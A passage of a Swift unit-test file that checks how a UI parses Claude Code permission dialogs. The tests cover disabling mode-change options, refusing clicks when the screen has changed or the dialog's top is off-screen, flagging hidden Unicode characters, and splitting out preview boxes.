        XCTAssertEqual(f.answer(1, expected: p), .changed, "another command under the same option list")
        XCTAssertEqual(f.sent, [])
        f.screen = run2Screen
        XCTAssertEqual(f.answer(1, expected: p), .sent)
        XCTAssertEqual(f.sent, ["1"])
    }

    func testRealMultiLineBashComparesEveryLineOfTheDialog() throws {
        let p = try prompt(run13Screen)
        XCTAssertEqual(p.context, ["Bash command", tip, "Print two test lines with printf",
                                   #"│ /usr/bin/printf 'qa310 a\n'"#, "│",
                                   #"│ /usr/bin/printf '%s\n' qa310-long-"# + String(repeating: "a", count: 62),
                                   "│ " + String(repeating: "a", count: 50) + "-end",
                                   "This command requires approval"], "every command row with its gutter")
        XCTAssertEqual(p.options.map(\.label), ["Yes", "Yes, and switch to auto mode · auto mode handles these prompts for you", "No"])
        XCTAssertTrue(p.topFound)
        XCTAssertFalse(p.isOverCap, "10 measured rows (the tip and the long printf row wrap): at the cap (OQ-46)")
        XCTAssertEqual(p.layout.context.count, 10)
        XCTAssertEqual(p.options.map { p.isEnabled($0) }, [true, false, true], "the auto mode option off (OQ-45)")
        XCTAssertEqual(p.layout.caption.joined(), AgentCardLayout.modeCaption)

        for (why, from, to) in [("title", " Bash command\n", " Bash command (sandbox off)\n"),
                                ("tip", " " + tip + "\n", " Tip: press shift+tab to cycle modes\n"),
                                ("description", " Print two test lines with printf\n", " Print one test line with printf\n"),
                                ("first command row", #" │ /usr/bin/printf 'qa310 a\n'"#, " │ /usr/bin/false"),
                                ("empty command row dropped", "\n │\n", "\n"),
                                ("last, wrapped command row", "-end\n╌", "-END\n╌"),
                                ("reason", " This command requires approval\n", " This command writes outside the project\n")] {
            try assertOnlyTheContextDiffers(altered(run13Screen, from, to), from: p, why)
        }
    }

    /// QA #310's fx-L-run13-evil shape, with a benign row: the card was raised
    /// for run-13, the screen now holds another command. Yes and No are enabled,
    /// so a refusal there is the comparison's, not the enable rule's.
    func testAnswerOnARealMultiLineBashWithAnotherCommandSendsNothing() throws {
        let p = try prompt(run13Screen), f = FakeDch()
        f.screen = altered(run13Screen, #" │ /usr/bin/printf 'qa310 a\n'"#, " │ /usr/bin/false")
        XCTAssertEqual(f.answer(3, expected: p), .changed)
        XCTAssertEqual(f.answer(1, expected: p), .changed)
        f.screen = altered(run13Screen, " This command requires approval\n", " This command writes outside the project\n")
        XCTAssertEqual(f.answer(3, expected: p), .changed, "the reason line alone")
        XCTAssertEqual(f.sent, [])
        f.screen = run13Screen
        XCTAssertEqual(f.answer(3, expected: p), .sent)
        XCTAssertEqual(f.sent, ["3"])
    }

    func testRealWriteComparesItsPathAndContent() throws {
        let p = try prompt(run12Screen)
        XCTAssertEqual(p.question, "Do you want to create notes.txt?")
        XCTAssertEqual(p.context, ["Create file", "notes.txt", " 1 hello qa310"])
        XCTAssertEqual(p.options.map(\.detail), [[], ["session (shift+tab)"], []])
        XCTAssertTrue(p.topFound)
        XCTAssertFalse(p.isOverCap)
        XCTAssertEqual(p.options.map { p.isEnabled($0) }, [true, false, true], "Yes and No on; option 2, a mode change, off")
        XCTAssertEqual(p.layout.caption.joined(), AgentCardLayout.modeCaption)
        try assertOnlyTheContextDiffers(altered(run12Screen, " notes.txt\n╌", " other.txt\n╌"), from: p, "path")
        try assertOnlyTheContextDiffers(altered(run12Screen, "  1 hello qa310", "  1 hello qa311"), from: p, "content")
        let f = FakeDch()
        f.screen = altered(run12Screen, " notes.txt\n╌", " other.txt\n╌")
        XCTAssertEqual(f.answer(1, expected: p), .changed)
        f.screen = run12Screen
        XCTAssertEqual(f.answer(1, expected: p), .sent)
        XCTAssertEqual(f.sent, ["1"])
    }

    // MARK: - OQ-45 (b): a mode change is never one-click

    /// Over-width and fitting "switch to auto mode" / "switch to accept edits"
    /// options and the Edit dialog's shift+tab option are off and send nothing;
    /// over-width ones still wrap but are not "too long": all get the mode caption.
    func testModeChangingOptionsAreOffWhateverTheirWidth() throws {
        let auto = "3. Yes, and switch to auto mode · auto mode handles these prompts for you"
        let edits = "2. Yes, and switch to accept edits (auto-approve file edits and common file commands) for this\n      session (shift+tab)"
        for (why, screen, mode, fits) in [
            ("auto mode, over-width", run2Screen, 3, false),
            ("auto mode, fitting", altered(run2Screen, auto, "3. Yes, and switch to auto mode"), 3, true),
            ("accept edits, over-width", run12Screen, 2, false),
            ("accept edits, fitting", altered(run12Screen, edits, "2. Yes, and switch to accept edits"), 2, true),
            ("Edit, shift+tab", editScreen, 2, true)] {
            let p = try prompt(screen), o = p.options[mode - 1]
            XCTAssertTrue(o.isModeChange, why)
            XCTAssertEqual(p.layout.labels[mode - 1].count + p.layout.details[mode - 1].count > 1, !fits, "\(why): wraps")
            XCTAssertFalse(p.layout.tooWide.contains(mode), "\(why): off as a mode change, not as too wide")
            XCTAssertFalse(p.isEnabled(o), why)
            XCTAssertTrue(p.isEnabled(p.options[0]), "\(why): Yes stays on")
            XCTAssertEqual(p.layout.caption.joined(), AgentCardLayout.modeCaption, why)
            let f = FakeDch()
            f.screen = screen
            XCTAssertEqual(f.answer(mode, expected: p), .changed, why)
            XCTAssertEqual(f.sent, [], "\(why): nothing sent")
        }
    }

    func testDontAskAgainIsNotAModeChange() throws {
        let p = try prompt(run2Screen), o = p.options[1]
        XCTAssertEqual(o.label, "Yes, and don’t ask again for: /usr/bin/true qa310 *")
        XCTAssertFalse(o.isModeChange)
        XCTAssertTrue(p.isEnabled(o))
        let f = FakeDch()
        f.screen = run2Screen
        XCTAssertEqual(f.answer(2, expected: p), .sent)
        XCTAssertEqual(f.sent, ["2"])
    }

    /// QA #325 H1: a 30-column Write dialog wraps "Yes, and switch to" / "accept
    /// edits" onto two lines; the whole text is the mode change, not the first line.
    func testRealNarrowWriteWithAWrappedSwitchToIsOff() throws {
        let p = try prompt(run6Screen), o = p.options[1]
        XCTAssertEqual(p.question, "notes.txt?", "the line above option 1; the wrapped head is context")
        XCTAssertEqual(o.label, "Yes, and switch to")
        XCTAssertEqual(o.hint, nil)
        XCTAssertEqual(o.detail, ["accept edits", "(auto-approve file edits", "and common file", "commands) for this"])
        XCTAssertTrue(o.isModeChange)
        XCTAssertFalse(p.layout.isEnabled(o))
        // Option 3 is Claude Code's own overprint, "Nossion (shift+tab)": off too, fails safe.
        XCTAssertEqual(p.options.map { p.isEnabled($0) }, [true, false, false])
        XCTAssertEqual(p.layout.caption.joined(), AgentCardLayout.modeCaption)
        let f = FakeDch()
        f.screen = run6Screen
        XCTAssertEqual(f.answer(2, expected: p), .changed)
        XCTAssertEqual(f.sent, [], "one click never switches to accept edits")
        XCTAssertEqual(f.answer(1, expected: p), .sent)
        XCTAssertEqual(f.sent, ["1"])
    }

    /// QA #325 M1: every plan-approval (ExitPlanMode) exit leaves plan mode, so
    /// each is a mode change, also when wrapped at a space or inside a word.
    func testPlanApprovalLabelsAreModeChanges() {
        func mode(_ label: String, _ detail: [String] = [], hint: String? = nil) -> Bool {
            AgentPromptOption(digit: 1, label: label, hint: hint, detail: detail).isModeChange
        }
        XCTAssertTrue(mode("Yes, and use auto mode"))
        XCTAssertTrue(mode("Yes, auto-accept edits"))
        XCTAssertTrue(mode("Yes, manually approve edits"))
        XCTAssertTrue(mode("Yes, clear context (42% used) and use auto mode"))
        XCTAssertTrue(mode("Yes, clear context (42% used) and bypass permissions"))
        XCTAssertTrue(mode("Yes, clear context (42% used) and auto-accept edits"))
        // Wrapped at a space, and hard-wrapped inside a word.
        XCTAssertTrue(mode("Yes, and use", ["auto mode"]))
        XCTAssertTrue(mode("Yes, auto-", ["accept edits"]))
        XCTAssertTrue(mode("Yes, manually", ["approve edits"]))
        XCTAssertTrue(mode("Yes, clear", ["context (42% used) and use", "auto mode"]))
        // "(shift+tab)" on a detail line, also split mid-token, with no hint and no prefix.
        XCTAssertTrue(mode("Yes, allow all edits during this", ["session (shift+tab)"]))
        XCTAssertTrue(mode("Yes, allow all edits during this", ["session (shift+", "tab)"]))
        XCTAssertTrue(mode("Yes, allow all edits", hint: "shift+tab"))
        // Not mode changes: plain yes, rules, and a bare (unparenthesised) shift+tab.
        XCTAssertFalse(mode("Yes"))
        XCTAssertFalse(mode("Yes, and don’t ask again for: /usr/bin/true qa310 *"))
        XCTAssertFalse(mode("Yes, and always allow access to tmp/ from this project"))
        XCTAssertFalse(mode("Tell Claude what to change", ["shift+tab to approve with this feedback"]))
    }

    /// QA #325 R8: an "always allow access" rule with no "(shift+tab)" stays one-click.
    func testAlwaysAllowAccessIsNotAModeChange() throws {
        let screen = altered(run2Screen, "2. Yes, and don’t ask again for: /usr/bin/true qa310 *",
                             "2. Yes, and always allow access to tmp/ from this project")
        let p = try prompt(screen), o = p.options[1]
        XCTAssertFalse(o.isModeChange)
        XCTAssertTrue(p.isEnabled(o))
        let f = FakeDch()
        f.screen = screen
        XCTAssertEqual(f.answer(2, expected: p), .sent)
        XCTAssertEqual(f.sent, ["2"])
    }

    /// QA #331 L1: Claude Code puts "(shift+tab)" on every file-dialog yes-session
    /// row; "always allow access to <dir>" only adds a directory, so it stays one
    /// click, unwrapped or wrapped mid-word. Every other "(shift+tab)" row, and any
    /// other "Yes, and always allow" wording on it, stays a mode change, and so does
    /// a dir row carrying any mode clause or a second "; Yes," clause, whichever
    /// clause leads (QA #343).
    func testDirRuleOnShiftTabIsNotAModeChange() throws {
        func mode(_ label: String, _ detail: [String] = [], hint: String? = nil) -> Bool {
            AgentPromptOption(digit: 2, label: label, hint: hint, detail: detail).isModeChange
        }
        XCTAssertFalse(mode("Yes, and always allow access to tmp/ for this session (shift+tab)"))
        XCTAssertFalse(mode("Yes, and always allow access to tmp/ for this session", hint: "shift+tab"))
        XCTAssertFalse(mode("Yes, and always al", ["low access to tmp/ for this", "session (shift+tab)"]))
        XCTAssertFalse(mode("Yes, and alw", ["ays allow acc", "ess to tmp/ for this session"], hint: "shift+tab"))
        XCTAssertTrue(mode("Yes, allow all edits during this session (shift+tab)"))
        XCTAssertTrue(mode("Yes, and always allow all edits (shift+tab)"))
        XCTAssertTrue(mode("Yes, and always allow", ["all edits"], hint: "shift+tab"))
        XCTAssertTrue(mode("Yes, and always allow reads of tmp/ for this session (shift+tab)"))
        // 2.1.309 joins setMode acceptEdits and the dir grant with "; ", mode row first.
        let combined = "Yes, and switch to accept edits (auto-approve file edits and common file commands)"
            + " for this session; Yes, and always allow access to tmp/ for this session (shift+tab)"
        XCTAssertTrue(mode(combined))
        XCTAssertTrue(mode("Yes, and switch to accept edits (auto-approve file edits and com",
                           ["mon file commands) for this session; Yes, and always al",
                            "low access to tmp/ for this session (shift+tab)"]))
        // Dir clause first: any mode clause anywhere still makes it a mode change.
        let dir = "Yes, and always allow access to tmp/ for this session; "
        XCTAssertTrue(mode(dir + "Yes, and switch to accept edits (auto-approve file edits and common"
                           + " file commands) for this session (shift+tab)"))
        XCTAssertTrue(mode("Yes, and always al", ["low access to tmp/ for this session; Yes, and swi",
                                                  "tch to accept ed", "its for this session (shift+tab)"]))
        XCTAssertTrue(mode(dir + "Yes, allow all edits during this session (shift+tab)"))
        XCTAssertTrue(mode(dir + "Yes, auto-accept edits (shift+tab)"))
        XCTAssertTrue(mode(dir + "Yes, and use auto mode (shift+tab)"))
        XCTAssertTrue(mode(dir + "Yes, manually approve edits (shift+tab)"))
        XCTAssertTrue(mode(dir + "Yes, clear context (42% used) (shift+tab)"))
        XCTAssertTrue(mode(dir + "accept edits", hint: "shift+tab"))
        XCTAssertTrue(mode(dir + "allow all edits", hint: "shift+tab"))
        XCTAssertTrue(mode(dir + "auto mode", hint: "shift+tab"))
        // Only a leading dir clause is exempt: one further in stays a mode change.
        XCTAssertTrue(mode("Yes, allow reading from src/ during this session; " + dir + "(shift+tab)"))
        XCTAssertTrue(mode("Yes, allow reading from src/ during this session, Yes, and always allow access"
                           + " to tmp/ for this session (shift+tab)"))
        // QA #343: "; Yes," keeps every combined row off, even one naming no known clause.
        XCTAssertTrue(mode(dir + "Yes, and enable turbo for this session (shift+tab)"))
        // The clause check alone, with separators other than "; ".
        let bare = "Yes, and always allow access to tmp/ for this session"
        for sep in [", ", " · ", " and "] {
            XCTAssertTrue(mode(bare + sep + "Yes, and switch to plan mode (read-only) for this session (shift+tab)"))
        }
        XCTAssertTrue(mode(bare + ", Yes, and switch to bypass permissions for this session (shift+tab)"))
        XCTAssertTrue(mode(bare + " · Yes, clear context (42% used) and bypass permissions (shift+tab)"))
        XCTAssertTrue(mode(bare + " and Yes, manually approve edits (shift+tab)"))

        let screen = altered(run2Screen, "2. Yes, and don’t ask again for: /usr/bin/true qa310 *",
                             "2. Yes, and always allow access to tmp/ for this session (shift+tab)")
        let o = try prompt(screen).options[1]
        XCTAssertEqual(o.hint, "shift+tab")
        XCTAssertFalse(o.isModeChange)
    }

    /// A "No…" row on "(shift+tab)" is still a deny: on, and no mode caption for it.
    func testDenyOnShiftTabStaysOn() throws {
        let screen = altered(run12Screen, "3. No", "3. No, and tell Claude what to change (shift+tab)")
        let p = try prompt(screen), no = p.options[2]
        XCTAssertTrue(no.isModeChange)
        XCTAssertEqual(no.style(first: false), .deny)
        XCTAssertTrue(p.isEnabled(no))
        let f = FakeDch()
        f.screen = screen
        XCTAssertEqual(f.answer(3, expected: p), .sent)
        XCTAssertEqual(f.sent, ["3"])
        let only = AgentPrompt(question: "Proceed?", context: [], options: [
            AgentPromptOption(digit: 1, label: "Yes", hint: nil),
            AgentPromptOption(digit: 2, label: "No, keep planning", hint: "shift+tab")])
        XCTAssertEqual(only.options.map { only.isEnabled($0) }, [true, true])
        XCTAssertEqual(only.layout.caption, [], "no option is off for a mode change")
    }

    /// QA #325 L2: too long outranks a mode change in the caption.
    func testTooLongCaptionWinsOverModeCaption() throws {
        let p = try prompt(altered(run2Screen, "for: /usr/bin/true qa310 *", "for: \(wideAllow) *"))
        XCTAssertTrue(p.options[2].isModeChange)
        XCTAssertEqual(p.layout.tooWide, [2])
        XCTAssertEqual(p.layout.caption.joined(), AgentCardLayout.tooLongCaption)
    }

    // MARK: - OQ-46 (c): 10 context rows

    func testNineAndTenRowCommandsStayApprovableAndElevenIsDenyOnly() throws {
        for (rows, approvable) in [(9, true), (10, true), (11, false)] {
            let screen = bash21((1...(rows - 2)).map { "echo step \($0)" }), p = try prompt(screen)
            XCTAssertEqual(p.context.count, rows)
            XCTAssertEqual(p.isOverCap, !approvable, "\(rows) rows")
            XCTAssertEqual(p.options.map { p.isEnabled($0) }, [approvable, approvable, true], "\(rows) rows")
            let f = FakeDch()
            f.screen = screen
            XCTAssertEqual(f.answer(1, expected: p), approvable ? .sent : .changed, "\(rows) rows")
        }
    }

    /// run-10 (previews) is a prompt since #526: testPreviewFormSplitsTheBoxOffTheOptions.
    func testRealAskFormsAreApprovableAndMultiSelectIsContextOnly() throws {
        for (why, screen, head) in [("run-7 one question", run7Screen, "☐ Color"),
                                    ("run-9 two questions", run9Screen, "←  ☐ Color  ☐ Size  ✔ Submit  →")] {
            let p = try prompt(screen)
            XCTAssertEqual(p.question, "Which color?", why)
            XCTAssertEqual(p.context, [head], why)
            XCTAssertEqual(p.options.map(\.label), ["Red", "Green", "Blue", "Type something.", "Chat about this"], why)
            XCTAssertEqual(p.options.map(\.detail), [["Choose red"], ["Choose green"], ["Choose blue"], [], []], why)
            XCTAssertTrue(p.topFound, why)
            XCTAssertEqual(p.options.map { p.isEnabled($0) }, Array(repeating: true, count: 5), why)
            let f = FakeDch()
            f.screen = screen
            XCTAssertEqual(f.answer(2, expected: p), .sent, why)
        }
        for (why, screen) in [("run-8 multiSelect", run8Screen)] {
            XCTAssertNil(AgentPrompt.parse(screen), why)
            guard case .context = AgentPrompt.card(screen: screen) else { return XCTFail(why) }
        }
    }

    // MARK: - QA #310 F1: a short rule never becomes the frame width

    /// An Ask form scrolled past its top rule, with a 12-dash line in its
    /// question: the full-width rule above "Chat about this" sets the width, so
    /// the short line is text and the walk runs off the top.
    func testShortRuleInAnAskWhoseTopScrolledOffIsNotAFrame() throws {
        let p = try prompt(offTopShortRuleAsk)
        XCTAssertEqual(p.question, "Which deployment target?")
        XCTAssertEqual(p.context, ["Delete the production database?", "────────────", "Harmless note"], "the head is shown")
        XCTAssertFalse(p.topFound)
        XCTAssertEqual(p.options.map { p.isEnabled($0) }, Array(repeating: false, count: 6))
        XCTAssertEqual(p.layout.caption.joined(), AgentCardLayout.offTopCaption)
        let f = FakeDch()
        f.screen = offTopShortRuleAsk
        for d in 1...6 { XCTAssertEqual(f.answer(d, expected: p), .changed, "\(d)") }
        XCTAssertEqual(f.sent, [])
    }

    // MARK: - QA #310 mutant gaps

    /// C3, C5, C7: below the last option only rules and, last, one short footer
    /// saying "esc to cancel".
    func testOnlyRulesAndOneShortCancelFooterMayFollowTheOptions() {
        let live = bash21(["echo safe"]), footer = " Esc to cancel · Tab to amend"
        for (why, screen) in [("C3 a line above the footer", askFourScreen.replacingOccurrences(
                                   of: "\nEnter to select", with: "\nNotes: press n to add notes\n\nEnter to select")),
                              ("C5 a 69-character footer",
                               live.replacingOccurrences(of: footer, with: footer + " · ctrl+e to explain · shift+tab to cycle")),
                              ("C7 a spinner in the footer's place",
                               live.replacingOccurrences(of: footer, with: "✻ Thinking… (esc to interrupt)"))] {
            XCTAssertNil(AgentPrompt.parse(screen), why)
        }
        let footer64 = " " + "Esc to cancel".padding(toLength: 64, withPad: "·", startingAt: 0)
        XCTAssertNotNil(AgentPrompt.parse(live.replacingOccurrences(of: footer, with: footer64)), "64 is still a footer")
    }

    /// C15, C16: a 1.x box row loses its bars only beside a corner rule at
    /// column 0 or 1; the bottom corner alone is enough.
    func testOldBoxCornersAtColumnTwoOrOnlyAtTheBottom() throws {
        let rows = boxedScreen.split(separator: "\n", omittingEmptySubsequences: false)
        XCTAssertNil(AgentPrompt.parse(rows.map { "  " + $0 }.joined(separator: "\n")),
                     "C15: corners at column 2 are no box, so the bars stay and no option parses")
        let p = try prompt(rows.dropFirst().joined(separator: "\n"))
        XCTAssertEqual(p.context, ["Bash command", "  git push origin main", "  Push the release commit"],
                       "C16: the bottom corner unframes the rows")
        XCTAssertFalse(p.topFound)
        XCTAssertEqual(p.options.map { p.isEnabled($0) }, [false, true])
    }

    /// D2: a dotted inner frame (┄) is passed like a dashed one (╌), not taken
    /// for the dialog's top.
    func testDottedInnerFramesArePassedLikeDashedOnes() throws {
        let p = try prompt(bash21(["echo safe"]).replacingOccurrences(of: "╌", with: "┄"))
        XCTAssertEqual(p.context, bash21Context(["echo safe"]), "the title and description above the frames stay")
        XCTAssertTrue(p.topFound)
    }

    /// D3, D4: a solid frame ends the walk only once a non-blank line is
    /// collected. An Ask form with no tab bar has its top rule right above the
    /// question (or one blank line above it): the walk passes that rule into the
    /// transcript and runs off the screen top, so every option is off (fail
    /// safe) rather than approvable with nothing shown.
    func testASolidFrameWithOnlyBlanksUnderItDoesNotEndTheWalk() throws {
        for (why, tabBar) in [("D3: rule right above the question", " ☐ Color\n\n"),
                              ("D4: a blank line between", " ☐ Color\n")] {
            let screen = altered(run7Screen, tabBar, "")
            let p = try prompt(screen)
            XCTAssertEqual(p.question, "Which color?", why)
            XCTAssertEqual(p.context, ["❯ Use the AskUserQuestion tool to ask me 'Which color?' with options Red, Green, Blue"],
                           "\(why): the transcript line above the rule")
            XCTAssertFalse(p.topFound, why)
            XCTAssertEqual(p.options.map { p.isEnabled($0) }, Array(repeating: false, count: 5), why)
            let f = FakeDch()
            f.screen = screen
            for d in 1...5 { XCTAssertEqual(f.answer(d, expected: p), .changed, "\(why) \(d)") }
            XCTAssertEqual(f.sent, [], why)
        }
    }

    // MARK: - #483 item 8 for Bash, Write and Edit (QA #310 D13)

    /// The real Bash and Write dialogs and the Edit dialog with their top rule
    /// scrolled off, cut just below it or at the upper dashed frame: only No
    /// answers, under the off-top caption.
    func testBashWriteAndEditWithTheirTopRuleOffScreenAreDenyOnly() throws {
        for (name, screen) in [("Bash", run2Screen), ("Write", run12Screen), ("Edit", editScreen)] {
            let full = try prompt(screen), rows = screen.split(separator: "\n", omittingEmptySubsequences: false)
            XCTAssertTrue(full.topFound, name)
            let top = try XCTUnwrap(rows.firstIndex { $0.hasPrefix("─") }, name)
            let dash = try XCTUnwrap(rows.firstIndex { $0.contains("╌") }, name)
            for (cut, from) in [("below the top rule", top + 1), ("at the upper dashed frame", dash)] {
                let why = "\(name), \(cut)", s = rows[from...].joined(separator: "\n"), p = try prompt(s)
                XCTAssertEqual(p.question, full.question, why)
                XCTAssertEqual(p.options, full.options, why)
                if from == top + 1 { XCTAssertEqual(p.context, full.context, "\(why): the same lines, only the top is missing") }
                XCTAssertFalse(p.topFound, why)
                XCTAssertEqual(p.options.map { p.isEnabled($0) }, p.options.map { $0.digit == p.options.count }, why)
                XCTAssertEqual(p.layout.caption.joined(), AgentCardLayout.offTopCaption, why)
                let f = FakeDch()
                f.screen = s
                for o in p.options.dropLast() { XCTAssertEqual(f.answer(o.digit, expected: p), .changed, "\(why) \(o.digit)") }
                XCTAssertEqual(f.sent, [], "\(why): no approve click sends")
                XCTAssertEqual(f.answer(p.options.count, expected: p), .sent, "\(why): No still answers")
                XCTAssertEqual(f.sent, ["\(p.options.count)"], why)
            }
        }
    }

    // MARK: - #526: the AskUserQuestion preview form

    private let rowLayoutQuestion = "Which Agent Island row layout should the PR change use? "
        + #"Both show up to 3 PR chips (without the org name) before "+N pending PRs"."#

    private let rowLayoutPreview = [
        "✳  sec-1  [+3 agents]                              0s",
        "   Working  sec-branch…   39/64 done · 3 in progress · 22 queued",
        "   [cde-codebase#370] [solution#20399] [+2 pending PRs]  66 merged",
        "",
        "●  perf-1                                          15s",
        "   Idle  solution-mast…   74/81 done · 2 in progress · 5 queued",
        "   [account-data-service#13509] [solution#20399]   63 merged",
    ]

    /// Labels hold only the left column, the box is split out with its frame
    /// and "│ " padding off, "Notes:" is its own field, the "☐" tab header is
    /// context (not a checkbox option), and "Chat about this" plus the 66-char
    /// footer end the dialog.
    func testPreviewFormSplitsTheBoxOffTheOptions() throws {
        let p = try prompt(rowLayoutScreen)
        XCTAssertEqual(p.question, rowLayoutQuestion, "a wrapped question: every line under the chips, joined")
        XCTAssertEqual(p.context, ["☐ Row layout"], "the chip line only")
        XCTAssertEqual(p.options.map(\.digit), [1, 2])
        XCTAssertEqual(p.options.map(\.label), ["PR line (Recommended)", "Two lines, swapped"])
        XCTAssertEqual(p.options.map(\.detail), [[], []])
        XCTAssertEqual(p.preview, rowLayoutPreview)
        XCTAssertEqual(p.notes, ["Notes: press n to add notes"])
        XCTAssertTrue(p.topFound)
        XCTAssertFalse(p.hasHiddenCharacters)
        guard case .prompt(let c) = AgentPrompt.card(screen: rowLayoutScreen) else { return XCTFail("a prompt card") }
        XCTAssertEqual(c, p)

        let q = try prompt(run10Screen)
        XCTAssertEqual(q.question, "Which layout?")
        XCTAssertEqual(q.context, ["☐ Layout"])
        XCTAssertEqual(q.options.map(\.label), ["Grid", "List", "Cards"])
        XCTAssertEqual(q.options.map(\.detail), [[], [], []])
        XCTAssertEqual(q.preview, ["+------+------+------+", "| item | item | item |", "+------+------+------+"])
        XCTAssertEqual(q.notes, ["Notes: press n to add notes"])
    }

    /// `screen` with `n` blank cells inserted at the preview box's column (34)
    /// on every row of the two-column block: the box and "Notes:" move right.
    private func boxShifted(_ screen: String, by n: Int) -> String {
        screen.split(separator: "\n", omittingEmptySubsequences: false).map { r -> String in
            let cs = Array(r)
            guard cs.count > 34, cs[33] == " ", "┌│├└N".contains(cs[34]) else { return String(r) }
            return String(cs[..<34]) + String(repeating: " ", count: n) + String(cs[34...])
        }.joined(separator: "\n")
    }

    /// The cut follows the box's top-left corner, in cells: a box further right
    /// parses the same, and wide glyphs (an emoji, ideographs) in a label shift
    /// the corner's character index but not its cell column.
    func testPreviewSplitFollowsTheBoxCornerInCells() throws {
        let p = try prompt(rowLayoutScreen)
        for n in [1, 5, 12] {
            let s = boxShifted(rowLayoutScreen, by: n)
            XCTAssertTrue(s.contains(String(repeating: " ", count: 34 + n) + "└"), "\(n)")
            XCTAssertEqual(try prompt(s), p, "box at column \(34 + n)")
        }
        let pad = { (n: Int) in String(repeating: " ", count: n) }
        let wide = rowLayoutScreen  // 29 + 5 and 13 + 21 cells: the corner stays at cell 34
            .replacingOccurrences(of: "❯ 1. PR line (Recommended)" + pad(8) + "┌", with: "❯ 1. 🚀 PR line (Recommended)" + pad(5) + "┌")
            .replacingOccurrences(of: "  2. Two lines, swapped" + pad(11) + "│", with: "  2. 两行交换" + pad(21) + "│")
        XCTAssertNotEqual(wide, rowLayoutScreen)
        let w = try prompt(wide)
        XCTAssertEqual(w.options.map(\.label), ["🚀 PR line (Recommended)", "两行交换"])
        XCTAssertEqual(w.preview, rowLayoutPreview)
        XCTAssertEqual(AgentPrompt.cells("🚀"), 2)
        XCTAssertEqual(AgentPrompt.cells("两"), 2)
        XCTAssertEqual(AgentPrompt.cells("✳"), 1)
        XCTAssertEqual(AgentPrompt.cells("·"), 1)
    }

    /// The click guard compares the preview and the notes: a focus move (the
    /// caret and the preview both change) or one changed preview character is a
    /// different prompt, and so is a different notes line.
    func testPreviewAndNotesArePartOfTheComparedIdentity() throws {
        let p = try prompt(rowLayoutScreen)
        let moved = try prompt(rowLayoutScreen
            .replacingOccurrences(of: "❯ 1. PR line", with: "  1. PR line")
            .replacingOccurrences(of: "  2. Two lines", with: "❯ 2. Two lines")
            .replacingOccurrences(of: "[+2 pending PRs]  66", with: "[+2 pending PR]   66"))
        let char = try prompt(rowLayoutScreen.replacingOccurrences(of: "[+3 agents]", with: "[+4 agents]"))
        let notes = try prompt(rowLayoutScreen.replacingOccurrences(of: "press n to add notes", with: "prefer the grid"))
        for (why, q) in [("focus moved", moved), ("one preview character", char), ("notes", notes)] {
            XCTAssertEqual(q.options.map(\.label), p.options.map(\.label), why)
            XCTAssertEqual(q.question, p.question, why)
            XCTAssertEqual(q.context, p.context, why)
            XCTAssertNotEqual(q, p, why)
            XCTAssertEqual(Set([p, q]).count, 2, why)
        }
        XCTAssertEqual(moved.preview[2], "   [cde-codebase#370] [solution#20399] [+2 pending PR]   66 merged")
        XCTAssertEqual(notes.notes, ["Notes: prefer the grid"])
    }

    /// Preview and notes text go through the hidden-character rule like
    /// everything else the card shows.
    func testHiddenCharacterInAPreviewOrNotesIsCaught() throws {
        for (why, from, to) in [("preview", "sec-1  [+3", "sec-1\u{202E}  [+3"),
                                ("notes", "press n to", "press\u{200B} n to")] {
            let p = try prompt(rowLayoutScreen.replacingOccurrences(of: from, with: to))
            XCTAssertTrue(p.hasHiddenCharacters, why)
            XCTAssertEqual(p.layout.caption.joined(), AgentCardLayout.hiddenCaption, why)
        }
    }

    /// In the preview form a digit only moves the focus; Enter answers, and the
    /// island never sends Enter. So no click sends there, unchanged screen or not.
    func testPreviewFormSendsNothing() throws {
        let p = try prompt(rowLayoutScreen), f = FakeDch()
        f.screen = rowLayoutScreen
        for d in [1, 2] { XCTAssertEqual(f.answer(d, expected: p), .changed, "\(d)") }
        XCTAssertEqual(f.sent, [])
    }

    /// The preview form must still be the last thing on the screen, its box
    /// whole, and only it may end in "Chat about this" and the long footer.
    func testPreviewFormMustBeWholeAndLast() {
        let footer = "Enter to select · ↑/↓ to navigate · n to add notes · Esc to cancel"
        let rows = rowLayoutScreen.split(separator: "\n", omittingEmptySubsequences: false).map(String.init)
        let bottom = rows.firstIndex { $0.hasSuffix("┘") }!, perf = rows.firstIndex { $0.contains("perf-1") }!
        let without = { (k: Int, row: String) in
            rows.enumerated().map { $0.offset == k ? row : $0.element }.joined(separator: "\n")
        }
        for (why, screen) in [
            ("a shell prompt under the footer", rowLayoutScreen + "\n$ "),
            ("no Chat about this", rowLayoutScreen.replacingOccurrences(of: "  Chat about this\n", with: "")),
            ("a short footer", rowLayoutScreen.replacingOccurrences(of: footer, with: "Esc to cancel")),
            ("a line between the notes and the rule",
             rowLayoutScreen.replacingOccurrences(of: "Notes: press n to add notes\n", with: "Notes: press n to add notes\nstray\n")),
            ("no box bottom", without(bottom, "")),
            ("a box row without its right bar", without(perf, String(rows[perf].dropLast()))),
            ("a label running into the box", rowLayoutScreen.replacingOccurrences(
                of: "  2. Two lines, swapped" + String(repeating: " ", count: 11) + "│",
                with: "  2. " + String(repeating: "x", count: 29) + "│")),
            ("a normal form ending like a preview form", askFourScreen
                .replacingOccurrences(of: "  6. Chat about this", with: "  Chat about this")
                .replacingOccurrences(of: "Enter to select · ↑/↓ to navigate · Esc to cancel", with: footer)),
        ] {
            XCTAssertNil(AgentPrompt.parse(screen), why)
        }
    }

    // MARK: - #526 phase 2: the preview block on the card

    private func size(_ l: AgentCardLayout) -> CGFloat { CTFontGetSize(l.previewFont) }

    /// One size for the whole block: the context size when every row fits,
    /// else the largest 0.25 pt step that fits the widest row, never under
    /// 7 pt; there a row too wide is cut and ends in "…", one row each.
    func testPreviewBlockStepsDownToFitAndClipsAtTheFloor() throws {
        let w = G.cardContextWidth
        var p = try prompt(rowLayoutScreen)
        XCTAssertEqual(size(p.layout), 10.0, "the operator's case: 66 SF Mono cells fit at 10 pt in 410 pt")
        XCTAssertEqual(p.layout.preview, rowLayoutPreview)
        for r in p.layout.preview { XCTAssertTrue(G.fits(r, p.layout.previewFont, w), r) }
        let widest = try XCTUnwrap(rowLayoutPreview.max { G.width($0, G.contextFont) < G.width($1, G.contextFont) })
        XCTAssertFalse(G.fits(widest, CTFontCreateCopyWithAttributes(G.contextFont, 10.25, nil, nil), w), "the largest step")
        XCTAssertEqual(p.layout.previewLine, 12)

        p.preview = ["short", "rows"]
        XCTAssertEqual(size(p.layout), CTFontGetSize(G.contextFont), "fits: the context size")
        XCTAssertEqual(p.layout.previewLine, 13, "the font's own line, 11 pt SF Mono")

        for extra in [3, 9, 17] {
